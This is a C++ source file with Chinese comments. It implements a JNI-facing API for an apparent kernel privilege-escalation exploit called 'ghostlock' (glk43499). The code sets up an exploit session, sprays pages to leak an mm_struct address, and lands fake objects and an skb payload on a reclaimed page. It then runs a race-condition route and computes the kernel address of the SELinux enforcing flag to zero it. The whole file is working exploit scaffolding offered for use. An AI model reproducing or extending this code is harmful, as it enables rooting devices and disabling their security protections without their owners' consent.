/**
 * @file api.cpp
 * @brief `api.h` 的实现：JNI 与设备探针共用的普通 C 入口。
 *
 * @note 单会话、沿用 `session::g_exploit_session`；多实例句柄是 P3 的工作。
 * @note 目标只支持 W1 语义（`WriteMode::Zero`、`preserve_child=0`）；其它形状
 *       由后续批次经参数传入。
 * @note 阶段：P-A（JNI v0）过渡物。
 */
#include "api.h"

#include <cerrno>
#include <cstdint>

#include "backend.h"
#include "dev_profile.h"
#include "target.h"
#include "log.h"
#include "memory.h"
#include "profile.h"
#include "race.h"
#include "route.h"
#include "session.h"
#include "support.h"

namespace {
    struct ApiState final {
        bool created = false;
        bool landed = false;
        /* 一次性状态机：discover 产出一次 land；land 产出一次 execute。 */
        bool land_pending = false;
        bool exec_pending = false;
        std::uint64_t target = 0;
        std::uint64_t mm_struct = 0;
        std::uintptr_t base = 0;
        std::int32_t step = 0;
        std::int32_t error_number = 0;
        ghostlock::memory::WriteRequest request{};
        ghostlock::core::PageSprayInputs spray{};
        ghostlock::core::RaceRunParams race{};
        ghostlock::support::SprayResult spray_result{};
    };

    ApiState &state() {
        static ApiState s;
        return s;
    }

    /** @brief 用当前 target 重建 request/spray/race 三件套。 */
    void rebuild_inputs(std::uint64_t target) {
        ApiState &s = state();
        s.target = target;
        s.request = ghostlock::memory::WriteRequest::make(
            static_cast<std::uintptr_t>(target), ghostlock::memory::WriteMode::Zero, 0);
        s.spray = ghostlock::support::page_spray_inputs_from_session(s.request);
        s.race = ghostlock::race::race_run_params_from_session(s.request, &s.spray);
    }

    void record(const ghostlock::route::RouteStatus &status) {
        ApiState &s = state();
        s.step = status.step;
        s.error_number = status.error_number;
    }

    /** @brief 记录一次 API 级拒绝（step 70+ 属于边界守卫，不是 route 的错误）。 */
    std::int32_t refuse(std::int32_t step, std::int32_t error_number) {
        ApiState &s = state();
        s.step = step;
        s.error_number = error_number;
        return 0;
    }
} // namespace

extern "C" {
int32_t glk43499_api_create(void) {
    ApiState &s = state();
    if (s.created) return -EALREADY;

    /* 进程级前置必须与直连路径一致，否则喷页的 fd/线程规模会不同：
     * - set_limit：抬高 RLIMIT_NOFILE/线程上限（喷页要开数百个 memfd）；
     * - set_unbuffer：stdio 不缓冲，门禁日志不会丢；
     * - pin_to_core：主线程绑核（与 dev 路径的 CPU 0 一致）。
     * 信号处理器仍由调用方决定（dev 装 SIGSEGV 等，生产由 Kotlin 决定）。 */
    ghostlock::kernel::set_limit();
    ghostlock::kernel::set_unbuffer();
    ghostlock::kernel::pin_to_core(0);

    ghostlock::profile::kernel_offsets decoded{};
    ghostlock::core::build_dev_515_profile(decoded);

    auto &session = ghostlock::session::g_exploit_session;
    session.profile = ghostlock::profile::TargetProfile::from(&decoded);
    session.runtime.main_cpu = 0;
    session.runtime.consumer_cpu = 1;
    session.heap.init();
    session.race.main_cpu = 0;
    session.race.consumer_cpu = 1;
    if (session.addresses.init(&session.profile) != 0) {
        return -EIO;
    }
    s.created = true;
    s.landed = false;
    s.land_pending = false;
    s.exec_pending = false;
    s.mm_struct = 0;
    s.base = 0;
    s.step = 0;
    s.error_number = 0;
    return 0;
}

std::uint64_t glk43499_api_discover(std::uint64_t target) {
    ApiState &s = state();
    if (!s.created) return 0;
    rebuild_inputs(target);
    s.spray_result = ghostlock::support::spray_begin(s.spray);
    s.landed = false;
    s.exec_pending = false;
    if (!s.spray_result.valid()) {
        s.mm_struct = 0;
        s.land_pending = false;
        refuse(72, EAGAIN);   /* 喷页/泄漏失败：可重试 */
        return 0;
    }
    s.mm_struct = static_cast<std::uint64_t>(s.spray_result.mm_struct);
    s.land_pending = true;    /* 这一页只允许被 land 一次 */
    return s.mm_struct;
}

std::uint64_t glk43499_api_land(std::uint64_t mm_struct, std::uint64_t target) {
    ApiState &s = state();
    if (!s.created || target != s.target) return 0;
    /* 一次性守卫：不允许对同一页 land 两次（会覆盖 reclaim.fd 并 close(-1)）。 */
    if (!s.land_pending) {
        refuse(70, EALREADY);
        return 0;
    }
    /* 地址必须与最近一次 discover 一致；不一致说明调用方拿错了结果。 */
    if (s.mm_struct == 0 || mm_struct != s.mm_struct) {
        s.land_pending = false;
        refuse(73, EINVAL);
        return 0;
    }
    s.base = ghostlock::support::land_with(s.spray, s.spray_result);
    s.land_pending = false;   /* 无论成败，这一页都已消费：失败要重新 discover */
    s.landed = s.base != 0;
    if (!s.landed) {
        refuse(74, EAGAIN);   /* 页被拒收 / 落页失败：可重试 */
        return 0;
    }
    s.exec_pending = true;    /* 这一页只允许被 execute 一次 */
    return static_cast<std::uint64_t>(s.base);
}

std::uint64_t glk43499_api_land_with_payload(std::uint64_t mm_struct,
                                            std::uint64_t target,
                                            const uint8_t *skb_payload,
                                            size_t len) {
    ApiState &s = state();
    if (!s.created || target != s.target) return 0;
    if (!s.land_pending) {
        refuse(70, EALREADY);
        return 0;
    }
    if (s.mm_struct == 0 || mm_struct != s.mm_struct) {
        s.land_pending = false;
        refuse(73, EINVAL);
        return 0;
    }
    s.base = ghostlock::support::land_with(s.spray, s.spray_result, skb_payload, len);
    s.land_pending = false;
    s.landed = s.base != 0;
    if (!s.landed) {
        refuse(74, EAGAIN);
        return 0;
    }
    s.exec_pending = true;
    return static_cast<std::uint64_t>(s.base);
}

int32_t glk43499_api_execute_select(std::uint64_t target) {
    (void) target;
    /* 保留面：select 的 plant 只能留 native，但该 route 无自有真机门禁。 */
    return -ENOSYS;
}

int32_t glk43499_api_execute_tcp(std::uint64_t target) {
    (void) target;
    return -ENOSYS;
}

int32_t glk43499_api_execute_mcast(std::uint64_t target) {
    ApiState &s = state();
    if (!s.created || target != s.target) return 0;
    /* 一次性守卫：同一页只能跑一次 PI 事务（页上的 fake 对象会被消耗）。 */
    if (!s.exec_pending || !s.landed) {
        refuse(71, EALREADY);
        return 0;
    }
    s.exec_pending = false;
    const ghostlock::route::RouteStatus status =
        ghostlock::race::run_main_route_threads(s.race);
    record(status);
    return status.code == ghostlock::route::ROUTE_OK ? 1 : 0;
}

int32_t glk43499_api_run_mcast(std::uint64_t target) {
    ApiState &s = state();
    if (glk43499_api_discover(target) == 0) {
        s.step = 0;
        s.error_number = 0;
        return 0;
    }
    if (glk43499_api_land(s.mm_struct, target) == 0) return 0;
    return glk43499_api_execute_mcast(target);
}

size_t glk43499_api_skb_payload_size(void) {
    return static_cast<size_t>(ghostlock::kernel::SKB_SEND_SIZE);
}

uint64_t glk43499_api_selinux_target(void) {
    const ApiState &s = state();
    if (!s.created) return 0;
    /* KIMAGE_TEXT_BASE 属于 kernel 命名空间常量（dev profile 的一部分）。 */
    const std::uintptr_t image = ghostlock::kernel::KIMAGE_TEXT_BASE +
                                 ghostlock::core::kDevSelinuxEnforcingOff;
    return static_cast<std::uint64_t>(ghostlock::session::g_exploit_session.addresses.data_alias(image));
}

int32_t glk43499_api_last_step(void) { return state().step; }

int32_t glk43499_api_last_errno(void) { return state().error_number; }

void glk43499_api_close(void) {
    ApiState &s = state();
    /* 与 create 的 heap.init() 同效：关掉 reclaim fd、清页槽，不留 fd 给下一次。 */
    if (s.created) {
        ghostlock::session::g_exploit_session.heap.current.destroy();
        ghostlock::session::g_exploit_session.heap.prebuilt.destroy();
        ghostlock::session::g_exploit_session.heap.quarantine.destroy();
    }
    s.landed = false;
    s.land_pending = false;
    s.exec_pending = false;
    s.mm_struct = 0;
    s.base = 0;
    s.created = false;
}
}
